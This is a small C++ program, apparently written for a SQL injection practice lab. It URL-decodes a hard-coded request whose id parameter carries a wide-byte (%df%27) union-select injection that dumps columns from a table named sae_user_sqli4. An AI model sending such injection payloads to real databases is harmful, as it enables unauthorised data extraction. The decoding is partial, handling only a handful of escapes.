/*************************************************************************
	> File Name: url_decode.cpp
	> Author: DevilBin 
	> Mail: whu.evil.binary@gmail.com 
	> Created Time: 2016/4/10 15:39:46
 ************************************************************************/

#include <iostream>
#include <iomanip>
#include <fstream>
#include <cstdlib>
#include <string>
#include <vector>
#include <deque>
#include <list>
#include <map>
#include <algorithm>
#include <sstream>
#include <climits>

using namespace std;

int main() {
    string temp;
    vector<string> symbol_0 = {"%df", "'", " ", "(", ")", "#"};
    vector<string> symbol_1 = {"%df", "%27", "%20", "%28", "%29", "%23"};
    string s = "http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df%27%20union%20select%201,group_concat%28title_1%29,group_concat%28content_1%29%20from%20sae_user_sqli4%23";

    bool flag = true;
    unsigned index = 0;
    while(index < s.size()) {
        string sub_string = s.substr(index, 3);
        for(unsigned i = 0; i < symbol_1.size(); ++i) {
            if(symbol_1[i] == sub_string) {
                temp += symbol_0[i];
                index += 3;
                flag = false;
            }
        }
        if(flag) {
            temp += s[index];
            ++index;
        }
        flag = true;
    }
    cout << temp << endl;
    return 0;
}
